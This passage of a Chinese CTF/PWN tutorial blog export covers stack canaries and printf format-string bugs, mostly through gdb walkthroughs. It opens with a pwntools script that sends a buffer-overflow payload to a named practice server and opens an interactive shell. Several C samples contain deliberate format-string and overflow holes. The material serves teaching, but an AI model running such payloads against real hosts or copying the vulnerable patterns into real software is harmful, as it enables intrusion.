alt=\"图片\"></p>\n<p>编写exp2.py</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;xuenixiang.cn&#x27;</span>,<span class=\"number\">20149</span>)<span class=\"comment\">//远线程链接，不用加协议，要加端口号</span></span><br><span class=\"line\">    <span class=\"comment\">//或者ip地址：49.51.250.244        </span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x28</span> + <span class=\"number\">0x4</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = b<span class=\"number\">&#x27;</span>a<span class=\"number\">&#x27;</span>*offset + p32(<span class=\"number\">0x08048456</span>)</span><br><span class=\"line\"><span class=\"comment\">//python3 字节类型前加个b,才能保证加号前后连接才是字节类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></div></figure>\n\n\n<p>python3 运行即可！<br>最后：cat flag</p>\n<p>查看libc版本： ldd –version<br><img src=\"/2023/02/20/pwn003/3.png\" alt=\"图片\"></p>\n<p>顺便搭建一下python3.10.0<br>先去官网下载压缩包，放到环境下，然后解压：<br><img src=\"/2023/02/20/pwn003/4.png\" alt=\"图片\"><br>切换到python3.10.0的目录下：cd python3.10.0<br>.&#x2F;configure<br><img src=\"/2023/02/20/pwn003/5.png\" alt=\"图片\"><br>最后开始安装：make &amp;&amp; make install<br><img src=\"/2023/02/20/pwn003/6.png\" alt=\"图片\"></p>\n<p>检查 Python3.10.0是否正常可用：</p>\n\n        <h1 id=\"python3-V\">\n          <a href=\"#python3-V\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#python3-V\" class=\"headerlink\" title=\"python3 -V\"></a>python3 -V</h1>\n      <p>Python 3.10.0<br><img src=\"/2023/02/20/pwn003/7.png\" alt=\"图片\"></p>\n","categories":["PWN","03 远程PWN"],"tags":["PWN","03 远程PWN"]},{"title":"04. 细说Canary保护","url":"/2023/05/02/pwn004/","content":"<img src=\"https://ghchart.rshah.org/409ba5/unique-Elven\" alt=\"unqique-Elven's Blue Github Chart\">\n\n\n        <h1 id=\"一-canary保护：\">\n          <a href=\"#一-canary保护：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#一-canary保护：\" class=\"headerlink\" title=\"一.canary保护：\"></a>一.canary保护：</h1>\n      <p>在第二节课已经提到过，这里我们再把它引用过来复习：<br>CANARY (栈保护)<br>这个选项表示栈保护功能是否开启<br>栈溢出保护是一种缓冲区溢出攻击缓冲手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shsellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就会停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br>为了更加直观，画出有无canary保护的堆栈图对比一下：</p>\n<div class=\"table-container\"><table>\n<thead>\n<tr>\n<th>无canary</th>\n<th>保护有canary保护</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>局部变量</td>\n<td>局部变量</td>\n</tr>\n<tr>\n<td>EBP</td>\n<td>Cookie信息</td>\n</tr>\n<tr>\n<td>RET</td>\n<td>EBP</td>\n</tr>\n<tr>\n<td>参数</td>\n<td>RET</td>\n</tr>\n<tr>\n<td>-</td>\n<td>参数</td>\n</tr>\n</tbody></table></div>\n<hr>\n\n        <h1 id=\"二-实例程序解读\">\n          <a href=\"#二-实例程序解读\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#二-实例程序解读\" class=\"headerlink\" title=\"二.实例程序解读\"></a>二.实例程序解读</h1>\n      <p>root用户环境：<br>编写代码：  vi canary.c</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> <span class=\"type\">const</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> *name = <span class=\"string\">&quot;zhongyuwen&quot;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;My name is %s\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></div></figure>\n\n        <h2 id=\"保存-wq\">\n          <a href=\"#保存-wq\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#保存-wq\" class=\"headerlink\" title=\"保存    :wq\"></a>保存    :wq</h2>\n      \n        <h2 id=\"1-无canary保护：\">\n          <a href=\"#1-无canary保护：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-无canary保护：\" class=\"headerlink\" title=\"1.无canary保护：\"></a>1.无canary保护：</h2>\n      <p>编译，不开启canary保护：gcc -no-pie -fno-stack-protector -m32 -o canary canary.c<br><img src=\"/2023/05/02/pwn004/1.png\" alt=\"图片\"><br>编译成功出现一把小锁，权限不足，<br><img src=\"/2023/05/02/pwn004/2.png\" alt=\"图片\"><br>提权：chmod 777 canary<br>这就没限制了：<br><img src=\"/2023/05/02/pwn004/3.png\" alt=\"图片\"></p>\n<p>运行调试器打开canary：  gdb canary<br>先查看mian函数代码段：disass main<br><img src=\"/2023/05/02/pwn004/4.png\" alt=\"图片\"></p>\n<p>查看有什么断点：i b<br>删除断点：d 断点编号<br>加断点：b *地址<br><img src=\"/2023/05/02/pwn004/5.png\" alt=\"图片\"><br>运行：run<br><img src=\"/2023/05/02/pwn004/6.png\" alt=\"图片\"><br>可以看到这就运行到了我们加的断点的地方，也就是main函数入口处吧EP!<br>单步执行：next<br>分析代码：<br>第1行，把esp+4地址保存到ecx<br><img src=\"/2023/05/02/pwn004/7.png\" alt=\"图片\"></p>\n<p>+4行，内存对齐：</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">主流编译器规则规定“程序访问的地址必须向16字节对齐（被16整除的数）”内存对齐后可以提高访问效率。</span><br><span class=\"line\">我认为这就相当于最近流行的硬盘4K对齐吧！</span><br></pre></td></tr></table></div></figure>\n<p><img src=\"/2023/05/02/pwn004/8.png\" alt=\"图片\"><br>原来3c往上推了3行到30，刚好16字节</p>\n<p>+7行，把mian函数的返回地址压栈<br><img src=\"/2023/05/02/pwn004/9.png\" alt=\"图片\"></p>\n<p>+10行就开始第二节课讲的正常操作，压入栈帧了等等。<br>退出：q</p>\n<hr>\n\n        <h2 id=\"2-有canary保护\">\n          <a href=\"#2-有canary保护\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-有canary保护\" class=\"headerlink\" title=\"2.有canary保护\"></a>2.有canary保护</h2>\n      <p>重新覆盖编译：<br>开启canary保护，为所有函数插入保护：gcc -no-pie -fstack-protector-all -m32 -o canary canary.c<br><img src=\"/2023/05/02/pwn004/10.png\" alt=\"图片\"><br>记得提权：chmod 777 canary<br>调试：gdb canary<br>查看main函数：disass main<br><img src=\"/2023/05/02/pwn004/11.png\" alt=\"图片\"><br>可以看到正如定义红字可知，如上画线部分，向堆栈传入了gs段的一个参数，后面还做对比，决定是否需要跳转！</p>\n<p>加断点到加保护处：b *0x080484af<br>再运行：<br><img src=\"/2023/05/02/pwn004/12.png\" alt=\"图片\"></p>\n<p>+41行，把待验证数据保存到ebx<br><img src=\"/2023/05/02/pwn004/13.png\" alt=\"图片\"></p>\n<p>+41就是把数据转存到堆栈了<br>一直单步执行到+90，这里进行异或运算，对吧堆栈哪个位置的数据是否还和ebx一样<br>查看全部寄存器：i r<br><img src=\"/2023/05/02/pwn004/14.png\" alt=\"图片\"><br>0x286转化成二进制数后对照eip寄存器表：<br><img src=\"/2023/05/02/pwn004/15.png\" alt=\"图片\"><br>je指令看的时ZF位，其实也可以知道【】号里面写出来的都是置1的标识位了</p>\n<p>+90运行：<br><img src=\"/2023/05/02/pwn004/16.png\" alt=\"图片\"><br>此时ZF位置1了，je达成跳转条件\n </p>\n","categories":["PWN","04 远程PWN"],"tags":["PWN","04 远程PWN"]},{"title":"05. printf漏洞概述和调试","url":"/2023/05/02/pwn005/","content":"<img src=\"https://ghchart.rshah.org/409ba5/unique-Elven\" alt=\"unqique-Elven's Blue Github Chart\">\n\n\n        <h1 id=\"一-Format-String介绍\">\n          <a href=\"#一-Format-String介绍\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#一-Format-String介绍\" class=\"headerlink\" title=\"一.Format String介绍\"></a>一.Format String介绍</h1>\n      <p>在C语言中，我们常用的输出函数有pritnf、fprintf、vprintf、vfprintf、sprintf等。对于这些输出函数，Format String是其第一个参数，我们一般称为格式化字符串。</p>\n\n        <h2 id=\"简单介绍格式化字符串如何在输出函数进行解析：\">\n          <a href=\"#简单介绍格式化字符串如何在输出函数进行解析：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#简单介绍格式化字符串如何在输出函数进行解析：\" class=\"headerlink\" title=\"简单介绍格式化字符串如何在输出函数进行解析：\"></a>简单介绍格式化字符串如何在输出函数进行解析：</h2>\n      <p>printf接受变长的参数，其第一个参数位格式化字符串，后面的参数在实际运行时将于格式化字符串中特定的子字符串对应，将格式化字符串中的特定子串解析为相应的参数值。</p>\n\n        <h1 id=\"二-格式化字符串漏洞\">\n          <a href=\"#二-格式化字符串漏洞\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#二-格式化字符串漏洞\" class=\"headerlink\" title=\"二.格式化字符串漏洞\"></a>二.格式化字符串漏洞</h1>\n      <p>我们知道printf函数在执行时，首先进行格式化字符串的解析–从栈（或寄存器）获取参数并于符号说明进行匹配，比如参数个数少于符号声明个数时，就有可能造成泄露。</p>\n\n        <h1 id=\"三-实例程序1canary-c\">\n          <a href=\"#三-实例程序1canary-c\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#三-实例程序1canary-c\" class=\"headerlink\" title=\"三.实例程序1canary.c\"></a>三.实例程序1canary.c</h1>\n      <p>先使用上节课用到的源程序看看，这里注意一个细节：printf函数里面没有参数！<br><img src=\"/2023/05/02/pwn005/1.png\" alt=\"图片\"></p>\n<p>老方法运行：gdb canary</p>\n\n        <h2 id=\"直接先运行：\">\n          <a href=\"#直接先运行：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#直接先运行：\" class=\"headerlink\" title=\"直接先运行：\"></a>直接先运行：</h2>\n      <p><img src=\"/2023/05/02/pwn005/2.png\" alt=\"图片\"></p>\n\n        <h2 id=\"调试再运行：\">\n          <a href=\"#调试再运行：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#调试再运行：\" class=\"headerlink\" title=\"调试再运行：\"></a>调试再运行：</h2>\n      <p>查看main函数：disass mian<br>上节课我们分析的时canary保护，这次在后面加断点跳过canary保护：b *0x080484bb<br>执行：run<br><img src=\"/2023/05/02/pwn005/3.png\" alt=\"图片\"><br>+65行，把eax - 0x1a555传入edx，其实这就是输出内容的地址<br><img src=\"/2023/05/02/pwn005/4.png\" alt=\"图片\"><br>+71行，就是把输出内容的地址压栈！<br><img src=\"/2023/05/02/pwn005/5.png\" alt=\"图片\"><br>+74行，要调用printf函数了，由于没有参数，所以它还是去esp+4的默认值，我们可以修改这里的数据就可以达到输出修改的内容：<br>先用0x80485ab里面的数据填充<br>修改：set *(0xffffd0e4)&#x3D;0x80485ab<br><img src=\"/2023/05/02/pwn005/6.png\" alt=\"图片\"></p>\n<p>默认参数被修改后：<br><img src=\"/2023/05/02/pwn005/7.png\" alt=\"图片\"></p>\n<p>然后直接运行可以看到后面的参数被加入进来了：c<br><img src=\"/2023/05/02/pwn005/8.png\" alt=\"图片\"></p>\n\n        <h1 id=\"四-实例程序2pirntf1-c\">\n          <a href=\"#四-实例程序2pirntf1-c\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#四-实例程序2pirntf1-c\" class=\"headerlink\" title=\"四.实例程序2pirntf1.c\"></a>四.实例程序2pirntf1.c</h1>\n      \n        <h2 id=\"编写代码：\">\n          <a href=\"#编写代码：\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#编写代码：\" class=\"headerlink\" title=\"编写代码：\"></a>编写代码：</h2>\n      <figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> str [<span class=\"number\">0x10</span>];</span><br><span class=\"line\">        read(<span class=\"number\">0</span>,str,<span class=\"number\">0x20</span>);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;zhong %s.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></div></figure>\n<p>提权：chmod 777 printf1.c<br>编译：gcc -no-pie -fstack-protector-all -m32 -o printf1 printf1.c<br><img src=\"/2023/05/02/pwn005/9.png\" alt=\"图片\"></p>\n<p>和第一个程序一样；运行gdb；查看main函数；<br><img src=\"/2023/05/02/pwn005/10.png\" alt=\"图片\"><br>在canary后加断点；b*0x080484de<br>运行：run<br><img src=\"/2023/05/02/pwn005/11.png\" alt=\"图片\"><br>+40行，提升堆栈空间<br>+43行，read()函数第三个参数0x20压栈<br>+45，+48行，read()函数第二个参数str的地址压栈<br>查看内容：x $ebp-0x1c<br><img src=\"/2023/05/02/pwn005/12.png\" alt=\"图片\"><br>+49行，read()函数第一个参数0压栈<br>+51行，执行read()函数，由于第一个参数是0，便从command line获取数据，我们输入yyds，此时观察寄存器和堆栈：<br><img src=\"/2023/05/02/pwn005/13.png\" alt=\"图片\"><br><img src=\"/2023/05/02/pwn005/14.png\" alt=\"图片\"><br><img src=\"/2023/05/02/pwn005/15.png\" alt=\"图片\"><br>+56行，外平栈<br><img src=\"/2023/05/02/pwn005/16.png\" alt=\"图片\"></p>\n<p>+59行，右提升堆栈空间，位执行print做准备，此时esp刚好指向我们输入的内容！<br><img src=\"/2023/05/02/pwn005/17.png\" alt=\"图片\"><br>+62，+68行，就是printf（）里面的内容压栈，之后，下一行就还是我们刚才输入的内容，紧跟其后！<br><img src=\"/2023/05/02/pwn005/18.png\" alt=\"图片\"></p>\n<p>+69行，执行printf输出！<br>此时即使没有给printf参数，但是，它还是默认输出来啦！<br><img src=\"/2023/05/02/pwn005/19.png\" alt=\"图片\"></p>\n<p>借用此漏洞，后面还可以实现输出canary保护的cookie值！敬请期待啊·！</p>\n","categories":["PWN","05 printf漏洞概述和调试"],"tags":["PWN","05 printf漏洞概述和调试"]},{"title":"06. 格式化字符串漏洞发生的条件","url":"/2023/05/03/pwn006/","content":"<img src=\"https://ghchart.rshah.org/409ba5/unique-Elven\" alt=\"unqique-Elven's Blue Github Chart\">\n\n\n        <h1 id=\"1-实例程序1printf2-c\">\n          <a href=\"#1-实例程序1printf2-c\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#1-实例程序1printf2-c\" class=\"headerlink\" title=\"1.实例程序1printf2.c\"></a>1.实例程序1printf2.c</h1>\n      <p>正常源码：</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s,%d,%s&quot;</span>,<span class=\"string\">&quot;hello world!&quot;</span>,<span class=\"number\">233</span>,<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></div></figure>\n<p>代码解释：可以知道第一个%s对应hello world!，%d对应233，第二个%s对应转义字符\\n换行</p>\n<p>提权：chmod 777 print2.c<br>编译：gcc -m32 -o printf2 printf2.c</p>\n<p>调试：gdb printf2<br>查看mian函数：disass main</p>\n<p>然后再printf函数加断点：b *0x56555552<br>再运行：</p>\n<p>可以清楚的看到printf（）函数里面的参数由于函数调用_cdecl被从右到左压栈<br>0xe9转化位十进制就是233<br>然后其实就是正常对应输出：</p>\n\n        <h1 id=\"2-实例程序2printf3-c\">\n          <a href=\"#2-实例程序2printf3-c\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#2-实例程序2printf3-c\" class=\"headerlink\" title=\"2.实例程序2printf3.c\"></a>2.实例程序2printf3.c</h1>\n      <p>漏洞源码：</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s %d %s %x %x %x %3$s&quot;</span>,<span class=\"string\">&quot;hello world!&quot;</span>,<span class=\"number\">233</span>,<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></div></figure>\n<p>代码解释：第一个%s对应输出hello world，%d对应233，第二个%s对应转义字符\\n换行，后面的格式化字符就对应后面堆栈里的随机内容了，注意%s$是输出对应第三行地址里面的内容，也就是换行\\n</p>\n<p>后面正常和上面一样的操作不多解释<br>哦对，加断点之前注意一个细节，注意运行完一遍，把地址调整号好正确</p>\n<p>查看main函数，继续加断点：</p>\n<p>运行：</p>\n<p>前面的对应关系我们已经知道，但是分析后面的对应关系：<br>第一个%x对应输出后面的ffffd120<br>第二个%x又对应下一行0<br>可以看到后面的堆栈就看不到连续被省略，此时用命令：stack 0x20 查看20行堆栈</p>\n<p> 所以可以继续后看连续的堆栈地址：<br>第三个%x默认对应还是0<br>最后那个%3$s其实就是打印第三个参数的意思，所以也是换行<br>所以我们就可以回顾一下刚才执行完后为什么输出那些东西了。</p>\n<p>注意：如果还有看不到的堆栈地址内容可以用以下方式查看：</p>\n<p>这是x类命令概念</p>\n\n        <h1 id=\"3-程序实例3printf4-c\">\n          <a href=\"#3-程序实例3printf4-c\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#3-程序实例3printf4-c\" class=\"headerlink\" title=\"3.程序实例3printf4.c\"></a>3.程序实例3printf4.c</h1>\n      <p>源代码：</p>\n<figure class=\"highlight c\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> a[<span class=\"number\">100</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(fgets(a,<span class=\"keyword\">sizeof</span> a,<span class=\"built_in\">stdin</span>)==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(a);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></div></figure>\n<p>同上略！</p>\n<p>fgets() 的原型为：</p>\n\n        <h1 id=\"include-lt-stdio-h-gt\">\n          <a href=\"#include-lt-stdio-h-gt\" class=\"heading-link\"><i class=\"fas fa-link\"></i></a><a href=\"#include-lt-stdio-h-gt\" class=\"headerlink\" title=\"include &lt;stdio.h&gt;\"></a>include &lt;stdio.h&gt;</h1>\n      <p>char *fgets(char *s, int size, FILE *stream);</p>\n<figure class=\"highlight plaintext\"><div class=\"table-container\"><table><tr><td class=\"code\"><pre><span class=\"line\">s 代表要保存到的内存空间的首地址，可以是字符数组名，也可以是指向字符数组的字符指针变量名。</span><br><span class=\"line\">size 代表的是读取字符串的长度。</span><br><span class=\"line\">stream 表示从何种流中读取，可以是标准输入流 stdin，也可以是文件流，即从某个文件中读取，这个在后面讲文件的时候再详细介绍。</span><br><span class=\"line\">标准输入流就是前面讲的输入缓冲区。所以如果是从键盘读取数据的话就是从输入缓冲区中读取数据，即从标准输入流 stdin 中读取数据，所以第三个参数为 stdin。</span><br><span class=\"line\">一个程序：</span><br><span class=\"line\">纯文本复制</span><br><span class=\"line\"># include &lt;stdio.h&gt;</span><br><span class=\"line\">int main(void)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char str[20];  /*定义一个最大长度为19, 末尾是&#x27;\\0&#x27;的字符数组来存储字符串*/</span><br><span class=\"line\">    printf(&quot;请输入一个字符串:&quot;);</span><br><span class=\"line\">    fgets(str, 7, stdin);  /*从输入流stdin即输入缓冲区中读取7个字符到字符数组str中*/</span><br><span class=\"line\">    printf(&quot;%s\\n&quot;, str);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></div></figure>\n<p>此时先执行一次：</p>\n<p>可以看到我们输入格式化字符串的话，会打印处对应堆栈内的随机内容！</p>\n<p>然后下断点，还是要注意细节哦，先运行，地址才不是偏移：<br>b *0x56555607</p>\n<p>运行：</p>\n<p>单步执行+输入：</p>\n<p>再观察：</p>\n<p>堆栈也许看的不够，那可以像上面一样：stack 0x20 查看32行</p>\n<p>由于一行堆栈只能存4字节内容，所以从0xffffd0a8到0xffffd0b4是连续储存我们输入的内容的。</p>\n<p>后面继续单步执行到+68行，还会遇到判断标志位跳转<br>这里之前所过不多说：记得修改命令：set $eflag &#x3D; 数值</p>\n<p>+77行，执行printf函数，执行前先看堆栈详情：</p>\n<p>可以看到，执行原理也是和上面的程序一样，字符原样输出，格式化字符接续匹配堆栈参数！<br>最后面其实还要注意fgets()函数会自动添加的换行操作！</p>\n","categories":["PWN","06 格式化字符串漏洞发生的条件"],"tags":["PWN","06 格式化字符串漏洞发生的条件"]}]